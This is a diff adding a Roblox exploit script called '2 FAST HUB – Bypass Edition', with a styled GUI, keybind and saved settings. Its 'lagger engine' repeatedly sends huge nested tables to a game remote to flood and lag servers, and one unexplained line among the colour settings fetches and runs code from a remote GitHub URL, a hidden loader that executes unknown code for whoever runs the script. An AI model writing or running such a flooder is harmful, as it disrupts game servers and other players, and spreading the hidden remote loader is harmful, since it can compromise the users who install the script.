@@ -1,0 +1,579 @@
+--// 2 FAST HUB – Bypass Edition (Final: power down, BYPASS glow, keybind fix, save)  
+--// Fully working flood engine
+local Players = game:GetService("Players")  
+local UserInputService = game:GetService("UserInputService")  
+local RunService = game:GetService("RunService")  
+local TweenService = game:GetService("TweenService")  
+local HttpService = game:GetService("HttpService")  
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+--==================================================  
+-- CONFIG (save keybind & power)  
+--==================================================
+local CONFIG_FILE = "TwoFastHubBypassConfig.json"
+local function SaveConfig(key, power, platform)  
+local data = {  
+Keybind = key.Name,  
+Power = power,  
+Platform = platform or "PC"  
+}  
+pcall(function()  
+writefile(CONFIG_FILE, HttpService:JSONEncode(data))  
+end)  
+end
+local function LoadConfig()  
+local exists = false  
+pcall(function() exists = isfile(CONFIG_FILE) end)  
+if not exists then return nil end  
+local data = nil  
+pcall(function()  
+data = HttpService:JSONDecode(readfile(CONFIG_FILE))  
+end)  
+return data  
+end
+--==================================================  
+-- LAGGER ENGINE  
+--==================================================
+local DEPTH      = 296  
+local SPAM_DELAY = 0.12  
+local running    = false  
+local bomb       = nil  
+local spamThread = nil
+local function buildBomb(power)  
+local maintable   = {}  
+local spammedtable = {}  
+table.insert(spammedtable, {})  
+local z = spammedtable[1]  
+for i = 1, DEPTH do  
+local tableins = {}  
+table.insert(z, tableins)  
+z = tableins  
+end  
+local maxRep = math.floor(power / (DEPTH + 2))  
+for i = 1, maxRep do  
+table.insert(maintable, spammedtable)  
+end  
+return maintable  
+end
+local function stopBypass()  
+running = false  
+if spamThread then task.cancel(spamThread) end  
+bomb       = nil  
+spamThread = nil  
+end
+local function startBypass(power)  
+stopBypass()  
+running = true  
+bomb = buildBomb(power)  
+spamThread = task.spawn(function()  
+while running do  
+if bomb then  
+pcall(function()  
+game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)  
+end)  
+end  
+task.wait(SPAM_DELAY)  
+end  
+end)  
+end
+--==================================================  
+-- GUI HELPERS  
+--==================================================
+local function getGuiParent()  
+if typeof(gethui) == "function" then  
+local ok, result = pcall(gethui)  
+if ok and result then return result end  
+end  
+local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)  
+if ok and coreGui then return coreGui end  
+return LocalPlayer:WaitForChild("PlayerGui")  
+end
+local function new(className, props, parent)  
+local obj = Instance.new(className)  
+for k, v in pairs(props or {}) do obj[k] = v end  
+obj.Parent = parent  
+return obj  
+end
+local function corner(obj, radius)  
+return new("UICorner", {CornerRadius = UDim.new(0, radius)}, obj)  
+end
+local function stroke(obj, color, thickness, transparency)  
+return new("UIStroke", {  
+Color            = color,  
+Thickness        = thickness or 1,  
+Transparency     = transparency or 0,  
+ApplyStrokeMode  = Enum.ApplyStrokeMode.Border,  
+}, obj)  
+end
+--==================================================  
+-- COLOR SCHEME (blue)  
+--==================================================
+local C = {  
+Bg        = Color3.fromRGB(5, 5, 8),  
+Card      = Color3.fromRGB(10, 10, 14),  
+Card2     = Color3.fromRGB(16, 18, 24),  
+White     = Color3.fromRGB(255, 255, 255),  
+LightText = Color3.fromRGB(225, 230, 240),  
+DimText   = Color3.fromRGB(150, 155, 165),  
+Blue      = Color3.fromRGB(35, 130, 255),  
+BrightBlue= Color3.fromRGB(80, 170, 255),  
+DarkBlue  = Color3.fromRGB(15, 55, 110),  
+Off       = Color3.fromRGB(15, 15, 20),  
+On        = Color3.fromRGB(20, 100, 200),  
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+--==================================================  
+-- CREATE GUI  
+--==================================================
+local parent = getGuiParent()  
+local old = parent:FindFirstChild("TwoFastHubBypassGui")  
+if old then old:Destroy() end
+local gui = new("ScreenGui", {  
+Name            = "TwoFastHubBypassGui",  
+ResetOnSpawn    = false,  
+IgnoreGuiInset  = true,  
+ZIndexBehavior  = Enum.ZIndexBehavior.Sibling,  
+}, nil)
+if type(syn) == "table" and type(syn.protect_gui) == "function" then  
+pcall(syn.protect_gui, gui)  
+elseif typeof(protectgui) == "function" then  
+pcall(protectgui, gui)  
+end  
+pcall(function() gui.Parent = parent end)  
+if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+--==================================================  
+-- MAIN FRAME (230×150)  
+--==================================================
+local main = new("Frame", {  
+Name              = "MainFrame",  
+Size              = UDim2.fromOffset(230, 150),  
+Position          = UDim2.new(0.5, -115, 0.5, -75),  
+BackgroundColor3  = C.Bg,  
+BorderSizePixel   = 0,  
+ClipsDescendants  = true,  
+Active            = true,  
+}, gui)  
+corner(main, 10)  
+stroke(main, C.Blue, 1.2)
+local photoHolder = new("Frame", {  
+Size              = UDim2.new(1, -6, 1, -37),  
+Position          = UDim2.fromOffset(3, 34),  
+BackgroundTransparency = 1,  
+BorderSizePixel   = 0,  
+ClipsDescendants  = true,  
+ZIndex            = 1,  
+}, main)  
+corner(photoHolder, 8)
+new("ImageLabel", {  
+Size              = UDim2.fromScale(1, 1),  
+BackgroundTransparency = 1,  
+Image             = "rbxassetid://115568637317716",  
+ScaleType         = Enum.ScaleType.Crop,  
+ImageTransparency = 0.22,  
+ZIndex            = 1,  
+}, photoHolder)
+new("Frame", {  
+Size              = UDim2.fromScale(1, 1),  
+BackgroundColor3  = C.Bg,  
+BackgroundTransparency = 0.7,  
+BorderSizePixel   = 0,  
+ZIndex            = 2,  
+}, photoHolder)
+--==================================================  
+-- HEADER (title + divider + glowing "BYPASS")  
+--==================================================
+local header = new("Frame", {  
+Size              = UDim2.new(1, -6, 0, 38),  
+Position          = UDim2.fromOffset(3, 3),  
+BackgroundColor3  = C.Card,  
+BorderSizePixel   = 0,  
+ClipsDescendants  = true,  
+ZIndex            = 4,  
+}, main)  
+corner(header, 8)
+local titleLabel = new("TextLabel", {  
+Size              = UDim2.new(1, 0, 0, 22),  
+Position          = UDim2.fromOffset(0, 0),  
+BackgroundTransparency = 1,  
+Text              = "2 FAST HUB",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamBlack,  
+TextSize          = 17,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+ZIndex            = 6,  
+}, header)
+task.spawn(function()  
+while titleLabel and titleLabel.Parent do  
+TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {  
+TextColor3 = C.BrightBlue  
+}):Play()  
+task.wait(0.6)  
+TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {  
+TextColor3 = C.White  
+}):Play()  
+task.wait(0.7)  
+end  
+end)
+new("Frame", {  
+Size              = UDim2.new(1, -16, 0, 1),  
+Position          = UDim2.fromOffset(8, 24),  
+BackgroundColor3  = C.BrightBlue,  
+BackgroundTransparency = 0.2,  
+BorderSizePixel   = 0,  
+ZIndex            = 6,  
+}, header)
+-- Glowing "BYPASS" subtitle  
+local bypassLabel = new("TextLabel", {  
+Size              = UDim2.new(1, 0, 0, 14),  
+Position          = UDim2.fromOffset(0, 26),  
+BackgroundTransparency = 1,  
+Text              = "BYPASS",  
+TextColor3        = C.LightText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 9,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+ZIndex            = 6,  
+}, header)
+-- Make BYPASS glow  
+task.spawn(function()  
+while bypassLabel and bypassLabel.Parent do  
+TweenService:Create(bypassLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {  
+TextColor3 = C.BrightBlue,  
+TextSize = 10  
+}):Play()  
+task.wait(0.5)  
+TweenService:Create(bypassLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {  
+TextColor3 = C.LightText,  
+TextSize = 9  
+}):Play()  
+task.wait(0.5)  
+end  
+end)
+--==================================================  
+-- POWER INPUT FIELD (Y=45)  
+--==================================================
+local powerInput = new("TextBox", {  
+Size              = UDim2.fromOffset(60, 14),  
+Position          = UDim2.new(0.5, -30, 0, 45),  
+BackgroundColor3  = C.Card2,  
+BorderSizePixel   = 0,  
+ClearTextOnFocus  = false,  
+Text              = "100000",  
+TextColor3        = C.LightText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 10,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+ZIndex            = 5,  
+}, main)  
+corner(powerInput, 4)  
+stroke(powerInput, C.Blue, 1)
+--==================================================  
+-- PLATFORM BUTTONS (Y=75)  
+--==================================================
+local pcBtn = new("TextButton", {  
+Size              = UDim2.fromOffset(26, 18),  
+Position          = UDim2.fromOffset(12, 75),  
+BackgroundColor3  = C.Card2,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "PC",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamSemibold,  
+TextSize          = 8,  
+ZIndex            = 5,  
+}, main)  
+corner(pcBtn, 4)  
+stroke(pcBtn, C.Blue, 1)
+local mobileBtn = new("TextButton", {  
+Size              = UDim2.fromOffset(26, 18),  
+Position          = UDim2.new(1, -38, 0, 75),  
+BackgroundColor3  = C.Card2,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "MB",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamSemibold,  
+TextSize          = 8,  
+ZIndex            = 5,  
+}, main)  
+corner(mobileBtn, 4)  
+stroke(mobileBtn, C.Blue, 1)
+--==================================================  
+-- POWER / STATUS RECTANGLE (Y=65, height 36)  
+--==================================================
+local ringFrame = new("Frame", {  
+Size              = UDim2.fromOffset(104, 36),  
+AnchorPoint       = Vector2.new(0.5, 0),  
+Position          = UDim2.new(0.5, 0, 0, 65),  
+BackgroundTransparency = 1,  
+ZIndex            = 3,  
+}, main)  
+corner(ringFrame, 8)  
+local ringStroke = stroke(ringFrame, C.Blue, 2.5)  
+ringStroke.LineJoinMode = Enum.LineJoinMode.Round
+local ringGradient = new("UIGradient", {  
+Rotation = 0,  
+Color = ColorSequence.new({  
+ColorSequenceKeypoint.new(0.00, C.DarkBlue),  
+ColorSequenceKeypoint.new(0.38, C.Blue),  
+ColorSequenceKeypoint.new(0.50, C.BrightBlue),  
+ColorSequenceKeypoint.new(0.62, C.Blue),  
+ColorSequenceKeypoint.new(1.00, C.DarkBlue),  
+})  
+}, ringStroke)
+local ringInner = new("Frame", {  
+Size              = UDim2.new(1, -4, 1, -4),  
+Position          = UDim2.new(0, 2, 0, 2),  
+BackgroundColor3  = C.Bg,  
+BorderSizePixel   = 0,  
+ZIndex            = 4,  
+}, ringFrame)  
+corner(ringInner, 6)
+local statusLabel = new("TextLabel", {  
+Size              = UDim2.fromOffset(28, 36),  
+Position          = UDim2.fromOffset(4, 0),  
+BackgroundTransparency = 1,  
+Text              = "OFF",  
+TextColor3        = C.DimText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 7,  
+TextXAlignment    = Enum.TextXAlignment.Left,  
+TextYAlignment    = Enum.TextYAlignment.Center,  
+ZIndex            = 5,  
+}, ringInner)
+local powerText = new("TextLabel", {  
+Size              = UDim2.new(1, -34, 1, 0),  
+Position          = UDim2.fromOffset(28, 0),  
+BackgroundTransparency = 1,  
+Text              = "100K",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamBlack,  
+TextSize          = 18,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+TextYAlignment    = Enum.TextYAlignment.Center,  
+ZIndex            = 5,  
+}, ringInner)
+--==================================================  
+-- KEYBIND ROW (Y=105)  
+--==================================================
+new("TextLabel", {  
+Size              = UDim2.fromOffset(50, 14),  
+Position          = UDim2.fromOffset(14, 105),  
+BackgroundTransparency = 1,  
+Text              = "KEYBIND",  
+TextColor3        = C.DimText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 7,  
+TextXAlignment    = Enum.TextXAlignment.Left,  
+TextYAlignment    = Enum.TextYAlignment.Center,  
+ZIndex            = 5,  
+}, main)
+local kbButton = new("TextButton", {  
+Size              = UDim2.fromOffset(36, 14),  
+Position          = UDim2.new(1, -48, 0, 105),  
+BackgroundColor3  = C.Card,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "[V]",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 6,  
+ZIndex            = 6,  
+}, main)  
+corner(kbButton, 3)  
+stroke(kbButton, C.Blue, 0.8)
+--==================================================  
+-- ACTIVATE BUTTON (Y=125)  
+--==================================================
+local activateButton = new("TextButton", {  
+Size              = UDim2.new(1, -16, 0, 18),  
+Position          = UDim2.fromOffset(8, 125),  
+BackgroundColor3  = C.Card,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "ACTIVATE",  
+TextColor3        = C.Blue,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 8,  
+ZIndex            = 5,  
+}, main)  
+corner(activateButton, 5)  
+stroke(activateButton, C.Blue, 0.5)
+--==================================================  
+-- STATE & LOGIC  
+--==================================================
+local active           = false  
+local boundKey         = Enum.KeyCode.V  
+local selectedPlatform = "PC"  
+local defaultPowers    = { PC = 100000, MOBILE = 65000 }  
+local currentPower     = defaultPowers.PC  
+local waitingForKey    = false   -- <-- MUST be declared BEFORE it's used
+-- Load saved config  
+local saved = LoadConfig()  
+if saved then  
+local key = Enum.KeyCode[saved.Keybind]  
+if key then boundKey = key end  
+if saved.Power and saved.Power > 0 then  
+currentPower = math.floor(saved.Power)  
+end  
+if saved.Platform == "PC" or saved.Platform == "MOBILE" then  
+selectedPlatform = saved.Platform  
+end  
+end
+local function formatPower(num)  
+if num >= 1000 then  
+return string.format("%dK", math.floor(num / 1000 + 0.5))  
+end  
+return tostring(num)  
+end
+local function updatePowerDisplay()  
+powerText.Text = formatPower(currentPower)  
+powerInput.Text = tostring(currentPower)  
+end
+local function highlightPlatform(platform)  
+pcBtn.BackgroundColor3 = C.Card2  
+mobileBtn.BackgroundColor3 = C.Card2  
+pcBtn.TextColor3 = C.White  
+mobileBtn.TextColor3 = C.White  
+if platform == "PC" then  
+pcBtn.BackgroundColor3 = C.Blue  
+pcBtn.TextColor3 = C.White  
+else  
+mobileBtn.BackgroundColor3 = C.Blue  
+mobileBtn.TextColor3 = C.White  
+end  
+end
+local function setActive(state)  
+active = state  
+if state then  
+statusLabel.Text       = "ON"  
+statusLabel.TextColor3 = C.BrightBlue  
+activateButton.BackgroundColor3 = C.Blue  
+activateButton.TextColor3       = C.White  
+ringStroke.Color = C.BrightBlue  
+ringGradient.Color = ColorSequence.new({  
+ColorSequenceKeypoint.new(0.00, C.Blue),  
+ColorSequenceKeypoint.new(0.38, C.BrightBlue),  
+ColorSequenceKeypoint.new(0.50, Color3.fromRGB(150, 220, 255)),  
+ColorSequenceKeypoint.new(0.62, C.BrightBlue),  
+ColorSequenceKeypoint.new(1.00, C.Blue),  
+})  
+startBypass(currentPower)  
+else  
+statusLabel.Text       = "OFF"  
+statusLabel.TextColor3 = C.DimText  
+activateButton.BackgroundColor3 = C.Card  
+activateButton.TextColor3       = C.Blue  
+ringStroke.Color = C.Blue  
+ringGradient.Color = ColorSequence.new({  
+ColorSequenceKeypoint.new(0.00, C.DarkBlue),  
+ColorSequenceKeypoint.new(0.38, C.Blue),  
+ColorSequenceKeypoint.new(0.50, C.BrightBlue),  
+ColorSequenceKeypoint.new(0.62, C.Blue),  
+ColorSequenceKeypoint.new(1.00, C.DarkBlue),  
+})  
+stopBypass()  
+end  
+activateButton.Text = state and "DEACTIVATE" or "ACTIVATE"  
+end
+local function setPlatform(platform)  
+selectedPlatform = platform  
+highlightPlatform(platform)  
+currentPower = defaultPowers[platform]  
+updatePowerDisplay()  
+if active then startBypass(currentPower) end  
+SaveConfig(boundKey, currentPower, platform)  
+end
+powerInput.FocusLost:Connect(function()  
+local num = tonumber(powerInput.Text)  
+if num and num > 0 then  
+currentPower = math.floor(num)  
+updatePowerDisplay()  
+if active then startBypass(currentPower) end  
+SaveConfig(boundKey, currentPower, selectedPlatform)  
+else  
+powerInput.Text = tostring(currentPower)  
+end  
+end)
+pcBtn.Activated:Connect(function() setPlatform("PC") end)  
+mobileBtn.Activated:Connect(function() setPlatform("MOBILE") end)
+-- Keybind button click: start listening  
+kbButton.Activated:Connect(function()  
+waitingForKey = true  
+kbButton.Text = "[?]"  
+end)
+-- Input handler for keybind change and activation  
+UserInputService.InputBegan:Connect(function(input, gameProcessed)  
+if waitingForKey then  
+local newKey = nil  
+if input.UserInputType == Enum.UserInputType.Keyboard then  
+newKey = input.KeyCode  
+elseif input.UserInputType == Enum.UserInputType.Gamepad1 then  
+newKey = input.KeyCode  
+end  
+if newKey and newKey ~= Enum.KeyCode.Unknown then  
+boundKey = newKey  
+kbButton.Text = "[" .. newKey.Name .. "]"  
+waitingForKey = false  
+SaveConfig(boundKey, currentPower, selectedPlatform)  
+end  
+return  
+end  
+-- Toggle bypass when bound key is pressed (only if not rebinding)  
+if not gameProcessed then  
+if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then  
+if input.KeyCode == boundKey then  
+setActive(not active)  
+end  
+end  
+end  
+end)
+activateButton.Activated:Connect(function() setActive(not active) end)
+activateButton.MouseEnter:Connect(function()  
+local target = active and Color3.fromRGB(50, 150, 255) or C.Card2  
+TweenService:Create(activateButton, TweenInfo.new(0.1), {BackgroundColor3 = target}):Play()  
+end)  
+activateButton.MouseLeave:Connect(function()  
+local target = active and C.Blue or C.Card  
+TweenService:Create(activateButton, TweenInfo.new(0.1), {BackgroundColor3 = target}):Play()  
+end)
+--==================================================  
+-- DRAGGING  
+--==================================================
+local dragging, dragStart, startPos = false, nil, nil  
+main.InputBegan:Connect(function(input)  
+if input.UserInputType == Enum.UserInputType.MouseButton1  
+or input.UserInputType == Enum.UserInputType.Touch then  
+dragging   = true  
+dragStart  = input.Position  
+startPos   = main.Position  
+end  
+end)
+UserInputService.InputChanged:Connect(function(input)  
+if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement  
+or input.UserInputType == Enum.UserInputType.Touch) then  
+local delta  = input.Position - dragStart  
+main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,  
+startPos.Y.Scale, startPos.Y.Offset + delta.Y)  
+end  
+end)
+UserInputService.InputEnded:Connect(function(input)  
+if input.UserInputType == Enum.UserInputType.MouseButton1  
+or input.UserInputType == Enum.UserInputType.Touch then  
+dragging   = false  
+end  
+end)
+--==================================================  
+-- RING ROTATION  
+--==================================================
+RunService.RenderStepped:Connect(function(dt)  
+ringGradient.Rotation = (ringGradient.Rotation + dt * 95) % 360  
+end)
+--==================================================  
+-- INIT  
+--==================================================
+-- Apply saved platform & power  
+highlightPlatform(selectedPlatform)  
+updatePowerDisplay()  
+kbButton.Text = "[" .. boundKey.Name .. "]"  
+setActive(false)  -- start with OFF
+print("2 FAST HUB – Bypass loaded (keybind fixed)")
